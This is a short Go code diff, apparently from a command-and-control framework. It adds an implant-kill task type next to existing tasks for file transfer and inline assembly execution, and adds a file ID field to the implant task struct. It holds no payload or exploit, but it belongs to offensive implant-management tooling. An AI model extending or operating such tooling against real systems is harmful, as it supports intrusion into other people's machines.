@@ -9,6 +9,7 @@ const (
 	SEND_FILE_TO_IMPLANT
 	GET_FILE_FROM_IMPLANT
 	EXEC_INLINE_ASM
+	KILL_IMPLANt
 )
 
 var TaskTypes = map[uint8]string{
@@ -36,6 +37,7 @@ type ImplantInfo struct {
 type ImplantTask struct {
 	TaskID      string
 	ImplantID   string
+	FileID      string
 	TaskType    uint8
 	TaskData    []byte
 	CreatedAt   int64
